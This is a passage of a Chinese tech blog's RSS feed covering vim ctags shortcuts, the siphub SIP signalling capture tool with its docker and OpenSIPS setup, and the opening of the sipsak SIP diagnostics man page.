&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vim main.c &lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;:set tags&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$PWD/tags &lt;span style=&#34;color:#75715e&#34;&gt;#让vim读区当前文件下的ctags文件&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 在多个文件的场景下，最好用绝对路径设置tags文件的位置 &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 否则有可能会报错neovim E433: No tags file&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;快捷键&#34;&gt;快捷键&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Ctrl+] 跳转到标签定义的地方&lt;/li&gt;
&lt;li&gt;Ctrl+o 跳到之前的地方&lt;/li&gt;
&lt;li&gt;ctrl+t 回到跳转之前的标签处&lt;/li&gt;
&lt;li&gt;:ptag some_key 打开新的面板预览some_key的定义&lt;/li&gt;
&lt;li&gt;
&lt;ul&gt;
&lt;li&gt;下一个定义处&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;h1 id=&#34;上一个定义处&#34;&gt;上一个定义处&lt;/h1&gt;
&lt;/li&gt;
&lt;li&gt;gd 当前函数内查找当前标识符的定义处&lt;/li&gt;
&lt;li&gt;gD 当前文件查找标识符的第一次定义处&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>siphub 轻量级实时SIP信令收包的服务</title>
      <link>https://wdd.js.org/opensips/tools/siphub/</link>
      <pubDate>Thu, 06 Aug 2020 11:19:01 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/tools/siphub/</guid>
      <description>&lt;p&gt;o我写siphub的原因是homer太难用了！！经常查不到想查的数据，查询的速度也很慢。&lt;/p&gt;
&lt;p&gt;项目地址：&lt;a href=&#34;https://github.com/wangduanduan/siphub&#34;&gt;https://github.com/wangduanduan/siphub&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;架构&#34;&gt;架构&lt;/h1&gt;
&lt;p&gt;SIP服务器例如OpenSIPS或者FS可以通过hep协议将数据写到siphub, siphub将数据规整之后写入MySql, siphub同时也提供Web页面来查询和展示SIP消息。
&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/tools/siphub/2022-12-02-17-14-05.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;功能介绍&#34;&gt;功能介绍&lt;/h1&gt;
&lt;p&gt;sip-hub是一个专注sip信令的搜索以及时序图可视化展示的服务。&lt;/p&gt;
&lt;p&gt;相比于Homer, sip-hub做了大量的功能简化。同时也提供了一些个性化的查询，例如&lt;strong&gt;被叫后缀查询，仅域名查询等。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;sip-hub服务仅有3个页面&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;sip消息搜索页面，用于按照主被叫、域名和时间范围搜索呼叫记录&lt;/li&gt;
&lt;li&gt;时序图展示页面，用于展示SIP时序图和原始SIP消息&lt;/li&gt;
&lt;li&gt;可以导入导出SIP消息&lt;/li&gt;
&lt;li&gt;可以查找A-Leg&lt;/li&gt;
&lt;li&gt;监控功能&lt;/li&gt;
&lt;li&gt;大量简化搜索结果页面。siphub的搜索结果页面，每个callId相同的消息，只展示一条。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;相关截图&#34;&gt;相关截图&lt;/h1&gt;
&lt;h2 id=&#34;搜索页面&#34;&gt;搜索页面&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;siphub的搜索结果仅仅展示callId相同的最早的一条记录，这样就避免了像homer那种，看起来很多个消息，实际上都是属于一个INVITE的。&lt;/li&gt;
&lt;li&gt;From字段和To字段都支持域名查询：@test.cc&lt;/li&gt;
&lt;li&gt;From字段也支持后缀查询，例如1234这种号码，可以只输入234就能查到，但是后缀要写完整，只查23是查不到的。&lt;/li&gt;
&lt;li&gt;To字段仅仅支持精确查询
&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/tools/siphub/2022-12-02-17-14-17.png&#34;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;信令展示页面&#34;&gt;信令展示页面&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;点击对应的消息，详情也会自动跳转出来。
&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/tools/siphub/2022-12-02-17-14-27.png&#34;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;安装&#34;&gt;安装&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;首先需要安装MySql数据库，并在其中建立一个名为siphub的数据库&lt;/li&gt;
&lt;li&gt;运行
&lt;ul&gt;
&lt;li&gt;dbHost 数据库地址&lt;/li&gt;
&lt;li&gt;dbUser 数据库用户&lt;/li&gt;
&lt;li&gt;dbName 数据库名&lt;/li&gt;
&lt;li&gt;dataKeepDays 抓包保存天数&lt;/li&gt;
&lt;li&gt;3000端口是web页面端口&lt;/li&gt;
&lt;li&gt;9060是hep消息收取端口&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker run -d -p 3000:3000 -p 9060:9060/udp &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;--env NODE_ENV&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;production &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;--env dbHost&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;1.2.3.4 &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;--env dbUser&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;root &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;--env dbPwd&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;123456&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;--env dbName&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;siphub &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;--env dataKeepDays&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;--name siphub wangduanduan/siphub
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;集成&#34;&gt;集成&lt;/h1&gt;
&lt;h2 id=&#34;opensips集成&#34;&gt;OpenSIPS集成&lt;/h2&gt;
&lt;p&gt;test witch OpenSIPS 2.4&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# add hep listen&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;listen&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;hep_udp:your_ip:9061
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;proto_hep.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# replace SIP_HUB_IP_PORT with siphub‘s ip:port&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;proto_hep&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;hep_id&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[hep_dst] SIP_HUB_IP_PORT;transport=udp;version=3&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;siptrace.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;siptrace&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;trace_id&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[tid]uri=hep:hep_dst&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# add ite in request route();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;REGISTER&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; !has_totag&lt;span style=&#34;color:#f92672&#34;&gt;()){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  sip_trace&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tid&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;d&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sip&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;freeswitch集成&#34;&gt;FreeSWITCH集成&lt;/h2&gt;
&lt;p&gt;fs version 版本要高于 1.6.8+&lt;/p&gt;</description>
    </item>
    <item>
      <title>sipsak</title>
      <link>https://wdd.js.org/opensips/tools/sipsak/</link>
      <pubDate>Fri, 31 Jul 2020 19:16:36 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/tools/sipsak/</guid>
      <description>&lt;p&gt;sipsak is a command line tool which can send simple requests to a SIP server. It can run additional tests on a SIP server which are usefull for admins and developers of SIP enviroments.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/nils-ohlmeier/sipsak&#34;&gt;https://github.com/nils-ohlmeier/sipsak&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;安装&#34;&gt;安装&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;apt-get install sipsak
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;发送options&#34;&gt;发送options&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sipsak -vv -p 192.168.2.63:5060 -s sip:8001@test.cc
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;man&#34;&gt;man&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SIPSAK&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                                     User Manuals                                                    SIPSAK&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;NAME
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       sipsak - a utility &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; various tests on sip servers and user agents
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SYNOPSIS
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       sipsak  &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-dFGhiILnNMRSTUVvwz&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-a  PASSWORD &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-b NUMBER &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-c SIPURI &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-C SIPURI &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-D NUMBER &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-e NUMBER &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-E STRING &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-f
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       FILE &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-g STRING &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-H HOSTNAME &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-j STRING &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-J STRING &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-l PORT &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-m NUMBER &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-o NUMBER &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-p HOSTNAME &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-P  NUMBER  &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-q REGEXP &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-r PORT &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-t NUMBER &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-u STRING &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-W NUMBER &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-x NUMBER &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; -s SIPURI
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;DESCRIPTION
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       sipsak  is  a  SIP stress and diagnostics utility.  It sends SIP requests to the server within the sip-uri and examines received
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       responses.  It runs in one of the following modes:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       - default mode
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              A SIP message is sent to destination in sip-uri and reply status is displayed.  The request is either taken from filename
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              or generated as a new OPTIONS message.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       - traceroute mode &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;-T&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              This mode is useful &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; learning request&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;s path. It operates similarly to IP-layer utility traceroute(8).
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;       - message mode (-M)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;              Sends  a  short  message (similar to SMS from the mobile phones) to a given target. With the option -B the content of the
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;              MESSAGE can be set. Useful might be the options -c and -O in this mode.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;       - usrloc mode (-U)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;              Stress mode for SIP registrar.  sipsak keeps registering to a SIP server at high pace. Additionally the registrar can  be
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;              stressed  with  the -I or the -M option.  If -I and -M are omitted sipsak can be used to register any given contact (with
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;              the -C option) for an account at a registrar and to query the current bindings for an account at a registrar.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;       - randtrash mode (-R)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;              Parser torture mode.  sipsak keeps sending randomly corrupted messages to torture a SIP server&amp;#39;&lt;/span&gt;s parser.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       - flood mode &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;-F&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              Stress mode &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; SIP servers.  sipsak keeps sending requests to a SIP server at high pace.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      If libruli &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;http://www.nongnu.org/ruli/&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; or c-ares &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;http://daniel.haxx.se/projects/c-ares/&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; support is compiled into the  sipsak
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       binary,  &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;  first a SRV lookup &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; _sip._tcp.hostname is made. If that fails a SRV lookup &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; _sip._udp.hostname is made. And
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; this lookup fails a normal A lookup is made. If a port was given in the target URI the SRV lookup is omitted. Failover,  load
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       distribution and other transports are not supported yet.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;OPTIONS
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       -a, --password PASSWORD
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              With  the  given  PASSWORD an authentication will be tryed on received &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;401 Unauthorized&amp;#39;&lt;/span&gt;. Authorization will be tryed on
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              time. If this option is omitted an authorization with an empty password &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; will be tryed. If the password is equal to -
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              the  password  will  be read from the standard input &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;e.g. the keyboard&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;. This prevents other users on the same host from
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              seeing the password the password in the process list.  NOTE: the password still can be read  from  the  memory  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;  other
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              users have access to it.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       -A, --timing
